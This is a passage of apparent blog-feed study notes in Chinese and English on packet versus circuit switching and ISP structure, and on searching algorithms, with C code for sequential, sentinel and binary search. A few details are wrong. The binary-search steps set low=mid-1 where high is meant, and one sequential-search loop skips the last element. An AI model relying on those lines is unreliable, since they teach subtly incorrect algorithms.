queue</em>）</strong>，<u>用于存储路由器准备发往那条链路的<strong>分组</strong></u>（存储转发时延）</li><li>each packet switch has multiple links, <strong>each</strong> link has <strong>an output buffer</strong></li><li>排队时延（<em>queue delay</em>）：如果到达的分组需要传输到某条链路，但该链路正忙于传输其他分组，则该到达分组必须在该输出缓存中等待，variable and <strong>depend on level of congestion in network</strong></li><li>分组丢失（丢包，packet lost）：一个分组到达时，若缓存已被其他等待传输的分组完全充满了，则到达的分组或已经排队的分组之一将被丢弃</li></ul></li><li><p>转发表（<em>forwarding table</em>）和路由选择协议（<em>routing protocol</em>）</p><ul><li>分组的首部包含有<strong>目的地的IP地址</strong>，当一个分组到达网络中的路由器时，路由器检查该分组的目的地址的<strong>一部分</strong></li><li>routing: determines source destination route taken by packets</li><li>forwarding: move packets from  router’s input to appropriate  router output</li><li>每台路由器有一个<strong>转发表（<em>forwarding table</em>）</strong>，<u>用于将目的地址（或目的地址的一部分）映射为输出链路</u></li><li>路由选择协议（<em>routing protocol</em>）：用于自动地设置转发表</li></ul></li></ul><h5 id="1-3-2电路交换（circuit-switching）">1.3.2电路交换（<em>circuit switching</em>）</h5><ul><li>通过<strong>网络链路</strong>和<strong>交换机</strong>移动数据的两种基本方法：电路交换、分组交换</li><li>在电路交换网络中，在端系统间通信会话器件，预留了端系统间通信沿路所需要的资源（缓存、链路传输速率）。在分组交换网络中，这些资源不是预留的，会话的报文按需使用这些资源，其后果是不得不等待（排队）接入通信线路</li><li>Circuit switching is commonly used in  traditional telephone networks (传统电话网络)</li><li>电路交换中的复用<ul><li>链路中的电路是通过**频分复用（<em>FDM，Frequency-Division Multiplexing</em>）<strong>或</strong>时分复用（<em>TDM，Time-Division Multiplexing</em>）**来实现的</li><li>FDM：<ul><li><strong>链路</strong>的<strong>频谱</strong>由<strong>跨越链路创建</strong>的<strong>所有连接所共享</strong></li><li>在电话网络中，这个频段通常具有4kHz的宽度（即4000赫兹或每秒4000周），该频段的宽度称为<strong>带宽（<em>bandwidth</em>）</strong></li><li>调频无线电台也使用FDM来共享88~108MHz的频谱，每个电台被分配一个特定的频段</li><li>the link dedicates a frequency band (频段) to each connection  for the duration（持续时间） of the connection</li><li>the width of the band is called the bandwidth (带宽).</li><li>each circuit continuously gets a fraction of the bandwidth</li></ul></li><li>TDM：<ul><li>时间被划分为<strong>固定区间</strong>的<strong>帧</strong>，每帧又被划分为<strong>固定数量</strong>的<strong>时隙</strong></li><li>当网络跨越一条链路创建一条连接时，网络在<strong>每个帧</strong>中为该连接<strong>指定一个时隙</strong>。这些时隙专门由该连接<strong>单独使用</strong>，一个时隙（在每个帧内）可用于传输该连接的数据</li><li>time is divided into frames(帧) of fixed duration, and each  frame is divided into a fixed number of time slots (时间片)</li><li>network dedicates one time slot in every frame to this connection, i.e. with one time slot available for use (in every frame) to transmit the connection’s data</li><li>each circuit gets all of the bandwidth periodically during brief intervals of time (slots)</li></ul></li></ul></li></ul><h5 id="分组交换与电路交换的对比">分组交换与电路交换的对比</h5><ul><li>分组交换<ul><li>不适合实时服务：端到端时延是可变的和不可预测的（主要因为排队时延的变动和不可预测所致）</li><li>提供了比电路交换更好的宽带共享</li><li>比电路交换更简单、更有效、实现成本更低</li><li>Packet switching (包交换): these resources are not reserved, use the resource on demand</li><li>Disadvantage: excessive congestion possible<ul><li>packet delay and loss</li><li>protocols needed for reliable data transfer,  congestion control</li></ul></li></ul></li><li>circuit  switching (电路交换)<ul><li>network must <strong>establish a connection</strong> between <strong>before</strong> send the information:  the connection is called a circuit(电路).</li><li>the network establishes the circuit, it also <strong>reserves a constant transmission  rate</strong> in the network’s links</li><li>transfer the data to the receiver at the <strong>guaranteed constant rate</strong></li></ul></li></ul><h5 id="Packet-switching-versus-circuit-switching">Packet switching versus  circuit switching</h5><ul><li>Critics of packet switching (批评者):<ul><li>packet switching is not suitable for real-time services (for example, telephone calls and video conference calls) because of  its variable and unpredictable end-to-end delays</li></ul></li><li>Proponents of packet switching (支持者):<ul><li>it offers <strong>better sharing of transmission capacity</strong> than circuit  switching</li><li>is <strong>simpler</strong>, more <strong>efficient</strong>，and <strong>less costly</strong> to implement than  circuit switching<ul><li>more efficient: packet switching allows more users to use  network</li></ul></li></ul></li><li>Packet switching versus  circuit switching<ul><li>the trend has certainly been in the direction of packet  switching, e.g. expensive overseas telephone call</li><li>great for burst data (突发数据)<ul><li>resource sharing</li><li>simpler, no call setup</li></ul></li><li>Disadvantage: excessive congestion possible<ul><li>packet delay and loss</li><li>protocols needed for reliable data transfer,  congestion control</li></ul></li><li>Q: How to provide circuit-like behavior?<ul><li>bandwidth guarantees needed for audio/video apps</li><li>still an unsolved problem (chapter 7)</li></ul></li></ul></li></ul><h5 id="1-3-3网络的网络">1.3.3网络的网络</h5><ul><li><p>ISP互联=》创建<strong>网络的网络</strong></p></li><li><p>End systems connect to Internet  via access ISPs</p><ul><li>don’t have to be telco or cable company</li><li>can be residential，company and university</li></ul></li><li><p>Access ISPs in turn must be  interconnected (互相连接).</p><ul><li>So that any two hosts can send  packets to each other</li></ul></li><li><p>Resulting network of networks is  very complex</p><ul><li>Evolution was driven by economics and national policies rather than  by performance considerations</li></ul></li><li><p>互联接入ISP的目的：使所有端系统能够彼此发送分组</p></li><li><p>网络结构1：用单一的全球承载ISP互联接入所有ISP， network  of networks-single global ISP</p></li><li><p>网络结构2：由数十万接入ISP和多个全球承载ISP组成，network  of networks-multiple global ISPs</p><ul><li>两层结构：全球承载供应商（顶层）、接入ISP（底层）</li></ul></li><li><p>网络结构3：多层等级结构，Internet structure 3/4：network of  networks-regional ISP+tier-1 ISP</p></li><li><p>网络结构4：（在3的基础上）由接入ISP、区域ISP、第一层ISP、PoP、多宿、对等、IXP组成的生态系统</p><ul><li>存在点（<em>PoP，Point of Presence</em>）<ul><li>存在于等级结构的所有层次，底层（接入ISP）除外</li><li>是<strong>提供商网络</strong>中的一台或多台<strong>路由器（在相同位置）群组</strong>，其中客户ISP能与提供商ISP连接</li><li>对于要与提供商PoP连接的<strong>客户网络</strong>，它能从<strong>第三方通信提供商</strong>租用<strong>高速链路</strong>直接将它的路由器之一连接到位于该PoP的一台<strong>路由器</strong></li></ul></li><li>多宿（<em>multi-home</em>）<ul><li>**任何ISP（除了第一层ISP）**可以与两个或更多提供商ISP连接</li><li>当一个ISP多宿时，即使它的提供商之一出现故障，它仍然能够继续**发送和接收分组*</li></ul></li><li>对等（<em>peer</em>）<ul><li>位于<strong>相同等级</strong>结构层次的邻近一对ISP能够对等，即能够直接将它们的网络连接到一起，使它们之间的<strong>所有流量直接连接</strong>而不是通过上游的中间ISP传输</li></ul></li><li>因特网交换点（<em>IXP，Internet Exchange Point</em>）<ul><li>通常在一个有自己的交换机的独立建筑物中</li><li>是一个<strong>汇合点</strong>，<strong>多个ISP</strong>能够在这里共同<strong>对等</strong></li></ul></li></ul></li><li><p>网络结构5：在4的顶部增加<strong>内容提供商网络（<em>content provider network</em>）</strong></p><p>network of  networks-Content provider network</p></li></ul><h3 id="Intern-vs-Intranet">Intern vs Intranet</h3><ul><li><p>Internet: “network of  networks”</p></li><li><p>loosely hierarchical (松散分层)</p></li><li><p>How are they like?</p><ul><li>Both use <strong>TCP/IP network protocol</strong></li><li>Both use <strong>e-mail</strong> and <strong>World Wide Web standards</strong></li></ul></li><li><p>What’s the differences？</p><ul><li>An Intranet is <strong>local and private</strong></li><li>An <strong>Intranet</strong> is more <strong>secure</strong> and more <strong>speed</strong></li><li>An Intranet is <strong>regulated(管制)</strong></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构-查找</title>
    <link href="/2024/02/19/%E6%9F%A5%E6%89%BE/"/>
    <url>/2024/02/19/%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<h3 id="查找的基本概念">查找的基本概念</h3><ul><li><p>查找表：由同一类型的数据元素（或记录）构成的集合（是一种数据结构）</p></li><li><p>静态查找表：<strong>查找</strong>的同时对查找表<strong>不做修改</strong>操作（如插入和删除）</p></li><li><p>动态查找表：<strong>查找</strong>的同时对查找表具有<strong>修改</strong>操作</p></li><li><p>关键字：记录中某个数据项的值，可用来<strong>识别</strong>一个记录</p></li><li><p>主关键字：<strong>唯一标识</strong>数据元素</p></li><li><p>次关键字：可以标识若干个数据元素</p></li><li><p><strong>ASL</strong>（Average Search Length）：平均搜索长度，关键字的平均比较次数</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><msub><mi>p</mi><mi>i</mi></msub><msub><mi>c</mi><mi>i</mi></msub></mrow><mtext>、</mtext><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ASL=\sum_{i=1}^{n}{p_i c_i}、\sum_{i=1}^{n}{p_i}=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p><ul><li><p>n ：记录的个数</p></li><li><p>p~i~ ：查找第i个记录的概率（通常认为p~i~=1/n）</p></li><li><p>c~i~ ：找到第i个记录所需要的比较次数</p><img src="/2024/02/19/%E6%9F%A5%E6%89%BE/135749.jpg" class=""></li></ul></li></ul><h3 id="🔍线性表的查找：">🔍线性表的查找：</h3><h6 id="顺序查找-star-：">顺序查找:star: ：</h6><ul><li><p>应用范围：顺序表或线性链表表示的静态查找表<strong>无论记录是否按关键词有序</strong>均可应用</p></li><li><p>数据元素类型定义：</p></li></ul>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>KeyType key;<span class="hljs-comment">//关键字域</span><br>InfoType otherinfo;<br>&#125;ElemType;<br></code></pre></td></tr></table></figure><ul><li><p>顺序表的表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>ElemType *R;<span class="hljs-comment">//表的基地址</span><br><span class="hljs-type">int</span> lengh;<br>&#125;SSTable;<br><span class="hljs-comment">//建表时按实际长度分配，0号单元留空</span><br></code></pre></td></tr></table></figure></li><li><p>在顺序表中查找值为e的数据元素</p><ul><li>每一步都要检验循环变量是否满足 i&gt;=1</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">LocateElem</span><span class="hljs-params">(SSTable ST, KeyType key)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; ST.lengh; i++)<br><span class="hljs-keyword">if</span> (ST.R[i].key == key)<span class="hljs-keyword">return</span> i;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//查找成功返回下标，失败返回0（0号未用）</span><br></code></pre></td></tr></table></figure><ul><li><p>设置监视哨的顺序查找</p><p>改进：把待查关键字key存入表头（“哨兵”），从后向前逐 个比较，可免去查找过程中每一步都要检测是否查找完毕，加 快速度。</p><p>即：本来0号未存数据，先将要查找的key存入其中，则循环一定会结束。将两次比较减少到一次。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">Search_Seq</span><span class="hljs-params">(SSTable ST, KeyType key)</span><br>&#123;<br><span class="hljs-comment">//若成功返回位置，否则返回0</span><br><span class="hljs-type">int</span> i;<br>ST.R[<span class="hljs-number">0</span>].key = key;<br><span class="hljs-keyword">for</span> (i = ST.lengh; ST.R[i].key != key; --i);<br><span class="hljs-comment">//不用for(i=n;i&gt;0;--i)或for(i=1;i&lt;=n;i++)</span><br><span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>:small_orange_diamond: 空间复杂度：<strong>一个辅助空间</strong>。</p></li><li><p>:small_orange_diamond: 时间复杂度：<strong>O(n)</strong></p></li><li><p>:small_orange_diamond: ASL:</p><p>:one: <strong>查找成功</strong>时的平均查找长度：设表中各记录查找概率相等 ASLs(n)=(1+2+ … +n)/n =<strong>(n+1)/2</strong></p><p>:two:<strong>查找不成功</strong>时的平均查找长度：ASLf=<strong>n+1</strong>   &lt;·····[n(n+1)/n]</p></li><li><p>特点：</p><p>:one:算法简单，对表结构无任何要求（顺序和链式）</p><p>:two:n很大时查找效率较低</p><p>:three:改进措施：<strong>非等概率</strong>查找时，可按照<strong>查找概率</strong>进行<strong>排序</strong></p></li></ul></li></ul><h6 id="折半查找-star-（Binary-Search，二分查找）">折半查找:star: （Binary Search，二分查找）</h6><ul><li><p>先确定待查询记录所在的<strong>范围</strong>（区间），然后逐步<strong>缩小范围</strong>直到找到或找不到该记录为止</p></li><li><p>:one:表长为n，low、high和mid分别指向待查元素所在区间的下界、上界和中点，k为给定值</p><p>:two:初始时，令low=1, high=n, mid= ⌊(low+high)/2⌋</p><p>:three:让k与mid指向的记录比较：若k==R[mid].key，查找成功；若k&lt;R[mid].key，则low=mid-1；若k&gt;R[mid].key，则low=mid+1</p><p>:four:重复上述操作，直至low&gt;high时，查找失败</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">Search_Bin</span><span class="hljs-params">(SSTable ST, KeyType key)</span><br>&#123;<br><span class="hljs-type">int</span> low = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> mid;<br><span class="hljs-type">int</span> high = ST.lengh;<br><span class="hljs-keyword">while</span> (low &lt;= high) &#123;<br>mid = (low + high) / <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (key == ST.R[mid].key)<span class="hljs-keyword">return</span> mid;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key &lt; ST.R[mid].key)high = mid - <span class="hljs-number">1</span>;<span class="hljs-comment">//前一子表查找</span><br><span class="hljs-keyword">else</span> low = mid + <span class="hljs-number">1</span>;<span class="hljs-comment">//后一子表查找</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//表中不存在待查元素</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>折半查找性能分析–判定树</p><img src="/2024/02/19/%E6%9F%A5%E6%89%BE/153124.jpg" class=""><ul><li>若所有结点的<strong>空指针域</strong>设置为一个指向一个方形结点的指针， 称方形结点为判定树的外部结点；对应的，圆形结点为内部结点</li><li><strong>查找成功</strong>时比较次数：为该结点在判定树上的<strong>层次数</strong>，不超过树的深度**d= [log~2~ n]+1 **(n个结点的判定树与n个结点的完全二叉树深度相同)</li><li><strong>查找不成功</strong>时，和给定值进行比较的关键字个数最多也不超过d = [log~2~ n]+1（同样等于路径上内部结点个数）</li></ul></li><li><p>每次将待查找记录所在区间减小一半，比顺序查找效率高</p></li><li><p>:small_orange_diamond: 时间复杂度：<strong>O(log~2~ n)</strong></p></li><li><p>:small_orange_diamond:ASL 查找成功时：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><msub><mi>p</mi><mi>i</mi></msub><msub><mi>c</mi><mi>i</mi></msub></mrow><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>h</mi></munderover><mrow><mi>j</mi><mo>∗</mo><msup><mn>2</mn><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><mo>=</mo><mfrac><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mi>n</mi></mfrac><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ASL=\sum_{i=1}^{n}{p_i c_i}=\frac{1}{n}\sum_{j=1}^{h}{j*2^{j-1}}=\frac{n+1}{n}log_2 (n+1)-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.2499em;vertical-align:-1.4138em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8747em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p></li><li><p>当n较大时（n&gt;50）时，平均查找长度约为<strong>log~2~ (n+1) -1</strong></p></li><li><p>适用于顺序存储结构的<strong>有序表</strong>，不宜用于链式结构</p></li><li><p>缺点：对表结构要求高，只能用于顺序存储的有序表。查找前需要排序，而排序本身是一种费时的运算。同时为了保持顺序表的有序性， 对有序表进行<strong>插入和删除</strong>时，<strong>平均比较和移动表中一半元素</strong>，这也是一种费时的运算。因此，折半查找不适用于数据元素<strong>经常变动</strong>的线性表</p></li></ul><h6 id="分块查找-索引顺序查找">分块查找(索引顺序查找)</h6><ul><li><p>分块有序，即分成若干子表，要求<strong>每个子表</strong>中的数值<strong>都</strong>比后一块中数值<strong>小</strong>（但子表内部未必有序）。然后将各子表中的<strong>最大关键字</strong>构成一个<strong>索引表</strong>，表中还要包含每个子表的<strong>起始地址</strong>（即头指针）</p><img src="/2024/02/19/%E6%9F%A5%E6%89%BE/170928.jpg" class=""></li><li><p>具体步骤：</p><p>:one: 对索引表使用折半查找法（因为索引表是有序表）</p><p>:two: 确定了待查关键字所在的子表后，在子表内采用顺序查找法（ 因为各子表内部可能是无序表）</p></li><li><p>:small_orange_diamond: 查找效率：</p><p>ASL=L~b~ (对索引表查找的ASL) + L~w~ (对块内查找的ASL)</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>≈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mfrac><mi>n</mi><mi>s</mi></mfrac><mo>+</mo><mn>1</mn><mo 